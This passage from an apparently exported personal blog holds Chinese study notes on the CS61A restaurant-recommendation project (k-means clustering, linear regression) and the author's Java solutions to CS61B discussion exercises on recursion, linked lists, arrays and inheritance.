<li><p>接下来就是两个构建在数据抽象层之上的方法，此时不考虑底层User和Restaurant的实现。分别实现了user_reviewed_restaurants方法和user_rating方法，前者接受user和一个restaurant的列表，并返回一个被该用户review过的restaurant列表；后者接受user和一个restaurant_name，并返回与之对应的用户评分</p>
</li>
<li><p>接下来就是要实现的Restaurant抽象，一个Restaurant实例由name, location, categories, price, reviews五大部分组成，我选择底层依然采用列表实现，与之对应的五项就是上述五项。前面四项的选择器直接用list的索引选择即可，最后一个部分需要用list comprehension选择review数据的评分，并以list的形式返回。</p>
</li>
</ul>
<h2 id="阶段2：非监督学习"><a href="#阶段2：非监督学习" class="headerlink" title="阶段2：非监督学习"></a>阶段2：非监督学习</h2><ul>
<li><p>简介：餐厅表现出以集群分布，我们要设计一种方式将临近的餐厅组合起来。</p>
</li>
<li><p>描述：k-means算法是一种发现集群中心的算法，之所以称之为非监督学习，是因为我们不会告诉该算法正确的集群是什么，而是让算法自己从数据集中推测出集群。k-means算法会在一个数据集中寻找到k个重心点，每一个都对应一个输入样本的集群。为了实现这个，k-means算法开始随机选中k个重心点，然后交替执行一下两步骤：1. 将餐厅分组成集群，在每一个集群中包含所有临近于同一个重心点的餐馆；2.对每一个集群重新计算一个新的重心点。</p>
</li>
<li><p>问题3：实现find_closest，接受一个location（一个经纬度的对，由两元素的sequence实现，第一个是维度，第二个是经度）和一个重心序列（也表示为经纬度对），返回最接近location的重心元素，如果两距离相等，返回第一个重心（centroid）。提示可用min函数实现，只需要一行代码！</p>
</li>
<li><p>问题4：实现group_by_centroid，接受一个restaurants序列和重心序列，返回一个集群列表。每一个集群列表中返回的集群都是一个餐厅列表，并且这些餐厅都近于一个重心序列中的重心点。提示用group_by_first函数group相同的key在[key, value]这样的列表中。结合提示和上述已经实现的find_closest函数，我们能够利用list comprehension构造一个列表，这个列表的每一项都是一个列表，并且第一项是重心坐标，第二项是抽象的restaurant实例，这样结合group_by_first就可以实现该需求。</p>
</li>
<li><p>问题5：实现find_centroid，这个函数基于餐厅的位置寻找一个集群（一个餐厅列表）的重心，返回的重心是所有餐厅的经纬度的均值。提示运用mean函数。</p>
</li>
<li><p>问题6：实现kmeans算法，脚手架已经填充好了算法的第一步。为了完成该算法，在每一次while循环的迭代中做一下两件事。1. 将restaurants分组为集群，每一个集群包含所有临近于同一重心点的餐厅。2.绑定centroids为所有集群的新的重心点列表。提示利用group_by_centroid和find_centroid方法</p>
</li>
</ul>
<h2 id="阶段3：监督学习"><a href="#阶段3：监督学习" class="headerlink" title="阶段3：监督学习"></a>阶段3：监督学习</h2><ul>
<li><p>简介：在这个阶段，你会预测用户将会给一个餐厅几分的评分。你将实现一个监督学习的算法尝试去从用户以往的评分去推广。通过分析过往得评分，我们可以预测用户将会给一个新的餐厅多的评分。</p>
</li>
<li><p>描述：为了预测评分，你将实现简单的最小二乘线性回归，一种常用的统计学策略用一条直线去估算某输入（比如价格）和某输出（比如评分）的关系，该算法接受一个输入对序列，并计算出一条最小化线和输出的平均方差的线的斜率和截距。</p>
</li>
<li><p>问题7：实现find_predictor函数，接受一个user，一个餐厅序列和一个特性函数feature_fn，这个函数返回两个值，一个是predictor函数，一个是r_squared值。predictor函数是一条y = ax + b的直线，回归系数计算有一系列的公式，可以参照官网。r平方表示了这条直线描述原数据的精准程度。Sxx和Syy计算类似，而Sxy的计算需要利用zip函数将xs序列和ys序列结合为一个[x,y]对的序列，然后利用list comprehension求得Sxy的值。</p>
</li>
<li><p>问题8：实现best_predictor，接受一个user参数和一个餐厅列表和一个feature_fns的序列，对于每个feature_fun计算出最佳的predictor函数并且返回拥有最高r方的predictor函数。这个问题也是利用了list comprehension，将reviewed数据传入find_predictor函数并生成一个predictor,r_squared对序列，然后借由此序列生成一个以predictor为键，r_squared为值的字典。再通过max函数接受生成的map，由key函数决定返回r_squared最大的predictor函数</p>
</li>
<li><p>问题9：实现rate_all，接受一个user,一个restaurants列表和一个feature_fns序列，返回一个字典，键为restaurants中每个restaurant的名字，而值是评分（数字）。若餐厅已被用户评分，则rate_all会为餐厅赋值为用户评分，若没有被评价过，则会利用最佳predictor函数计算评分，最佳predictor由feature_fns选出。我这里的做法是for in对restaurants中的所有restaurant遍历，若已被评分则用这个分数，否则用predictor计算。</p>
</li>
<li><p>问题10：为了集中注意力到特定的餐厅分类，实现search函数，这个函数接受一个分类查询和一个餐厅序列作为参数，返回所有包含这个分类的餐厅。提示利用list comprehension的条件筛选</p>
</li>
</ul>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc01-disc02</title>
    <url>/2018/09/01/cs61b-disc01-disc02/</url>
    <content><![CDATA[<h1 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h1><p>Implement fib which takes in an integer n and returns the nth Fibonacci number.<br>The Fibonacci sequence is 0,1,1,2,3,5,8,13,21,….</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>Extra: Implement fib in 5 lines or fewer. Your answer must be efficient.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fib2</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span> f0, <span class="keyword">int</span> f1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == k) &#123;</span><br><span class="line">        <span class="keyword">return</span> f0;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fib2(n, k + <span class="number">1</span>, f1, f0 + f1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h1><p>Implement square and squareMutative which are static methods that both take in<br>an IntList L and return an IntList with its integer values all squared. square does<br>this non-mutatively with recursion by creating new IntLists while squareMutative<br>uses a recursive approach to change the instance variables of the input IntList L.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// recursive square non-mutatively</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">square</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> IntList(L.first * L.first, square(L.rest));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// iteration square non-mutatively</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">square</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        IntList B = L.rest;</span><br><span class="line">        IntList LSquare = <span class="keyword">new</span> IntList(L.first * L.first, <span class="keyword">null</span>);</span><br><span class="line">        IntList C = LSquare;</span><br><span class="line">        <span class="keyword">while</span> (B != <span class="keyword">null</span>) &#123;</span><br><span class="line">            C.rest = <span class="keyword">new</span> IntList(B.first * B.first, <span class="keyword">null</span>);</span><br><span class="line">            B = B.rest;</span><br><span class="line">            C = C.rest;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> LSquare;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// recursive square mutatively</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">squareMutative</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        L.first = L.first * L.first;</span><br><span class="line">        squareMutative(L.rest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// iteration square mutatively</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">squareMutative2</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    IntList B = L;</span><br><span class="line">    <span class="keyword">while</span> (B != <span class="keyword">null</span>) &#123;</span><br><span class="line">        B.first *= B.first;</span><br><span class="line">        B = B.rest;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc03</title>
    <url>/2018/09/02/cs61b-disc03/</url>
    <content><![CDATA[<h1 id="Q1-More-Practice-with-Linked-Lists"><a href="#Q1-More-Practice-with-Linked-Lists" class="headerlink" title="Q1 More Practice with Linked Lists"></a>Q1 More Practice with Linked Lists</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SLList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">IntNode</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> item;</span><br><span class="line">        <span class="keyword">public</span> IntNode next;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IntNode</span><span class="params">(<span class="keyword">int</span> item, IntNode next)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.item = item;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IntNode first;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        first = <span class="keyword">new</span> IntNode(x, first);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1.1 Implement SLList.insert which takes in an integer x and inserts it at the given<br>position. If the position is after the end of the list, insert the new node at the end.<br>For example, if the SLList is 5 → 6 → 2, insert(10, 1) results in 5 → 10 → 6 → 2.</p>
<a id="more"></a>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> item, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="keyword">null</span> || position == <span class="number">0</span>) &#123;</span><br><span class="line">        addFirst(item);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    IntNode p = first;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; position &amp;&amp; p.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        p = p.next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    p.next = <span class="keyword">new</span> IntNode(item, p.next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1.2 Add another method to the SLList class that reverses the elements. Do this using<br>the existing IntNodes (you should not use new).</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Iteratively reverse, using prev, curr and next pointer</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    IntNode prevNode = <span class="keyword">null</span>;</span><br><span class="line">    IntNode currNode = first;</span><br><span class="line">    IntNode nextNode = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (currNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">        nextNode = currNode.next;</span><br><span class="line">        currNode.next = prevNode;</span><br><span class="line">        prevNode = currNode;</span><br><span class="line">        currNode = nextNode;</span><br><span class="line">    &#125;</span><br><span class="line">    first = prevNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// recursively reverse sllist, first traverse the list then go back while setting the direction reversed.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        first = reverseRecursiveHelper(first);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IntNode <span class="title">reverseRecursiveHelper</span><span class="params">(IntNode front)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (front == <span class="keyword">null</span> || front.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> front;</span><br><span class="line">        &#125;</span><br><span class="line">        IntNode reverse = reverseRecursiveHelper(front.next);</span><br><span class="line">        front.next.next = front;</span><br><span class="line">        front.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> reverse;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h1><p>2.1 Consider a method that inserts item into array arr at the given position. The<br>method should return the resulting array. For example, if x = [5, 9, 14, 15],<br>item = 6, and position = 2, then the method should return [5, 9, 6, 14, 15].<br>If position is past the end of the array, insert item at the end of the array.<br>Is it possible to write a version of this method that returns void and changes arr<br>in place (i.e., destructively)?<br>Extra: Write the described method:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] insert(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> item, <span class="keyword">int</span> position) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length + <span class="number">1</span>];</span><br><span class="line">    position = Math.min(arr.length, position);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; position; i++) &#123;</span><br><span class="line">        res[i] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    res[position] = item;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = position, i &lt; arr.length; i++) &#123;</span><br><span class="line">        res[i + <span class="number">1</span>] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Consider a method that destructively reverses the items in arr. For example calling<br>reverse on an array [1, 2, 3] should change the array to be [3, 2, 1].<br>What is the fewest number of iteration steps you need? What is the fewest number<br>of additional variables you need?<br>Extra: Write the method:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[arr.length - <span class="number">1</span> - i];</span><br><span class="line">        arr[arr.length - <span class="number">1</span> - i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Extra: Write a non-destructive method replicate(int[] arr) that replaces the<br>number at index i with arr[i] copies of itself. For example, replicate([3, 2,<br>1]) would return [3, 3, 3, 2, 2, 1].</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] replicate(<span class="keyword">int</span>[] arr) &#123;</span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> item : arr) &#123;</span><br><span class="line">        total += item;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[total];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> item : arr) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> counter = <span class="number">0</span>; counter &lt; item; counter++) &#123;</span><br><span class="line">            res[i] = item;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc04</title>
    <url>/2018/09/03/cs61b-disc04/</url>
    <content><![CDATA[<h1 id="Creating-Cats"><a href="#Creating-Cats" class="headerlink" title="Creating Cats"></a>Creating Cats</h1><p>1.1 Given the Animal class, fill in the definition of the Cat class so that when greet()<br>is called, the label “Cat” (instead of “Animal”) is printed to the screen. Assume<br>that a Cat will make a “Meow!” noise if the cat is 5 years or older and “MEOW!”<br>if the cat is less than 5 years old.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name, noise;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Animal</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.noise = <span class="string">"Huh?"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">makeNoise</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> noise.toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> noise;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">greet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Animal "</span> + name + <span class="string">" says: "</span> + makeNoise());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Cat</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name,age); <span class="comment">// Call superclass's constructor</span></span><br><span class="line">        <span class="keyword">this</span>.noise = <span class="string">"Meow!"</span>; <span class="comment">// Change the noise field of this instance</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">greet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Cat"</span> + name + <span class="string">" says: "</span> + makeNoise()); <span class="comment">// Change label to Cat</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="Raining-Cats-and-Dogs"><a href="#Raining-Cats-and-Dogs" class="headerlink" title="Raining Cats and Dogs"></a>Raining Cats and Dogs</h1><p>2.1 Assume that Animal and Cat are defined as above. What would Java print on each<br>of the indicated lines?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAnimals</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal a = <span class="keyword">new</span> Animal(<span class="string">"Pluto"</span>, <span class="number">10</span>);</span><br><span class="line">        Cat c = <span class="keyword">new</span> Cat(<span class="string">"Garfield"</span>, <span class="number">6</span>);</span><br><span class="line">        Dog d = <span class="keyword">new</span> Dog(<span class="string">"Fido"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        a.greet(); <span class="comment">// (A) ______________________Animal Pluto says Huh?</span></span><br><span class="line">        c.greet(); <span class="comment">// (B) ______________________Cat Garfield says Meow!</span></span><br><span class="line">        d.greet(); <span class="comment">// (C) ______________________Dog Fido says WOOF!</span></span><br><span class="line">        a = c;</span><br><span class="line">        ((Cat) a).greet(); <span class="comment">// (D) ______________________Cat Garfield says Meow!</span></span><br><span class="line">        a.greet(); <span class="comment">// (E) ______________________Cat Garfield says Meow!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age);</span><br><span class="line">        noise = <span class="string">"Woof!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">greet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Dog "</span> + name + <span class="string">" says: "</span> + makeNoise());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">playFetch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Fetch, "</span> + name + <span class="string">"!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Consider what would happen if we added the following to the bottom of main under<br>line 12:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a = <span class="keyword">new</span> Dog(<span class="string">"Spot"</span>, <span class="number">10</span>);</span><br><span class="line">d = a;</span><br></pre></td></tr></table></figure>

<p><strong>The second line will cause a compile-time error, because d’s static type is dog, while a’s static type is animal, animal may not be dog.</strong></p>
<p>Why would this code produce a compiler error? How could we fix this error?<br><strong>we can make a type cast for a, which is d = (Dog)a;</strong></p>
<h1 id="3-An-Exercise-in-Inheritance-Misery-Extra"><a href="#3-An-Exercise-in-Inheritance-Misery-Extra" class="headerlink" title="3 An Exercise in Inheritance Misery Extra"></a>3 An Exercise in Inheritance Misery Extra</h1><p>3.1 Cross out any lines that cause compile-time errors or cascading errors (failures that<br>occur because of an error that happened earlier in the program), and put an X<br>through runtime errors (if any). Don’t just limit your search to main, there could<br>be errors in classes A,B,C. What does D.main output after removing these lines?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>       <span class="keyword">public</span> <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="number">3</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Am1-&gt; "</span> + x);&#125;</span><br><span class="line"><span class="number">4</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Am2-&gt; "</span> + <span class="keyword">this</span>.x);&#125;</span><br><span class="line"><span class="number">5</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;x = <span class="number">99</span>;&#125;</span><br><span class="line"><span class="number">6</span> &#125;</span><br><span class="line"><span class="number">7</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="number">8</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Bm2-&gt; "</span> + x);&#125;</span><br><span class="line"><span class="number">9</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">(<span class="keyword">int</span> y)</span> </span>&#123;System.out.println(<span class="string">"Bm2y-&gt; "</span> + y);&#125;</span><br><span class="line"><span class="number">10</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Bm3-&gt; "</span> + <span class="string">"called"</span>);&#125;</span><br><span class="line"><span class="number">11</span> &#125;</span><br><span class="line"><span class="number">12</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="number">13</span>      <span class="keyword">public</span> <span class="keyword">int</span> y = x + <span class="number">1</span>;</span><br><span class="line"><span class="number">14</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Cm2-&gt; "</span> + <span class="keyword">super</span>.x);&#125;</span><br><span class="line"><span class="number">15</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m4</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Cm4-&gt; "</span> + <span class="keyword">super</span>.<span class="keyword">super</span>.x);&#125;</span><br><span class="line"><span class="number">16</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m5</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">"Cm5-&gt; "</span> + y);&#125;</span><br><span class="line"><span class="number">17</span> &#125;</span><br><span class="line"><span class="number">18</span> <span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line"><span class="number">19</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="number">20</span>          B a0 = <span class="keyword">new</span> A();</span><br><span class="line"><span class="number">21</span>          a0.m1();</span><br><span class="line"><span class="number">22</span>          a0.m2(<span class="number">16</span>);</span><br><span class="line"><span class="number">23</span>          A b0 = <span class="keyword">new</span> B();</span><br><span class="line"><span class="number">24</span>          System.out.println(b0.x);</span><br><span class="line"><span class="number">25</span>          b0.m1();</span><br><span class="line"><span class="number">26</span>          b0.m2();</span><br><span class="line"><span class="number">27</span>          b0.m2(<span class="number">61</span>);</span><br><span class="line"><span class="number">28</span>          B b1 = <span class="keyword">new</span> B();</span><br><span class="line"><span class="number">29</span>          b1.m2(<span class="number">61</span>);</span><br><span class="line"><span class="number">30</span>          b1.m3();</span><br><span class="line"><span class="number">31</span>          A c0 = <span class="keyword">new</span> C();</span><br><span class="line"><span class="number">32</span>          c0.m2();</span><br><span class="line"><span class="number">33</span>          C c1 = (A) <span class="keyword">new</span> C();</span><br><span class="line"><span class="number">34</span>          A a1 = (A) c0;</span><br><span class="line"><span class="number">35</span>          C c2 = (C) a1;</span><br><span class="line"><span class="number">36</span>          c2.m3();</span><br><span class="line"><span class="number">37</span>          c2.m4();</span><br><span class="line"><span class="number">38</span>          c2.m5();</span><br><span class="line"><span class="number">39</span>          ((C) c0).m3();</span><br><span class="line"><span class="number">40</span>          (C) c0.m3();</span><br><span class="line"><span class="number">41</span>          b0.update();</span><br><span class="line"><span class="number">42</span>          b0.m1();</span><br><span class="line"><span class="number">43</span>      &#125;</span><br><span class="line"><span class="number">44</span> &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc05</title>
    <url>/2018/10/06/cs61b-disc05/</url>
